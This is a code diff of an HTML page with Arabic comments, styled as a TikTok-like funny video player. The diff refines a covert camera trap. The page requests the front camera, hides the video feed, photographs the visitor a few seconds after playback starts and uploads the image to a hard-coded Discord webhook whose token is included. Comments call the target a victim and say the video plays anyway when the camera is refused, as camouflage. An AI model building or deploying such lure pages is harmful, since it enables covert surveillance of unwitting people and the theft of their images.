@@ -8,14 +8,12 @@
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
         
-        /* إطار اليوتيوب */
         #youtube-frame {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
             pointer-events: none;
         }
 
-        /* واجهة البدء الوهمية لضمان تشغيل الصوت */
         #start-overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -31,10 +29,11 @@
 
         .play-btn {
             width: 80px; height: 80px;
-            background: rgba(255,255,255,0.2);
+            background: #fe2c55; /* لون تيك توك */
             border-radius: 50%;
             display: flex; justify-content: center; align-items: center;
             font-size: 40px; margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(254, 44, 85, 0.5);
         }
 
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
@@ -51,7 +50,7 @@
 
     <div id="start-overlay">
         <div class="play-btn">▶️</div>
-        <p>اضغط لمشاهدة الفيديو المضحك</p>
+        <p style="font-weight: bold;">اضغط لمشاهدة الفيديو</p>
     </div>
 </div>
 
@@ -62,47 +61,54 @@
     const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
     const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
+    const camera = document.getElementById('hidden-camera');
 
-    // عند الضغط على زر البدء
     overlay.addEventListener('click', async () => {
-        // 1. تشغيل الفيديو بالصوت الأصلي (إرسال أمر لليوتيوب)
-        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
-        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
-        
-        // إخفاء واجهة البدء
-        overlay.style.display = 'none';
-
-        // 2. طلب الكاميرا وبدء التصوير
-        const camera = document.getElementById('hidden-camera');
         try {
+            // 1. تشغيل الكاميرا أولاً (الأولوية القصوى)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
             camera.srcObject = stream;
 
+            // 2. بمجرد قبول الكاميرا، نشغل الفيديو والصوت فوراً
+            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+            
+            // إخفاء الواجهة
+            overlay.style.display = 'none';
+
+            // 3. التقاط الصورة بعد 4 ثوانٍ من التشغيل الفعلي
             camera.onplaying = () => {
-                // ننتظر 5 ثواني لضمان أن المستخدم يضحك أو مندمج مع الصوت
                 setTimeout(() => {
-                    captureAndSend(camera);
-                }, 5000);
+                    captureAndSend();
+                }, 4000);
             };
-        } catch (err) { console.log("Camera access denied"); }
+        } catch (err) {
+            // إذا رفض الكاميرا، نشغل الفيديو على أي حال للتمويه
+            overlay.style.display = 'none';
+            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
+        }
     });
 
-    async function captureAndSend(cameraElement) {
+    async function captureAndSend() {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
 
-        if (cameraElement.videoWidth > 0) {
-            canvas.width = cameraElement.videoWidth;
-            canvas.height = cameraElement.videoHeight;
-            context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
+        if (camera.videoWidth > 0) {
+            canvas.width = camera.videoWidth;
+            canvas.height = camera.videoHeight;
+            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
                 const formData = new FormData();
-                formData.append('file', blob, 'victim_face.png');
-                await fetch(webhookURL, { method: 'POST', body: formData });
+                formData.append('file', blob, 'final_shot.png');
+                
+                try {
+                    await fetch(webhookURL, { method: 'POST', body: formData });
+                } catch (e) { console.log("Upload failed"); }
             }, 'image/png');
         }
     }
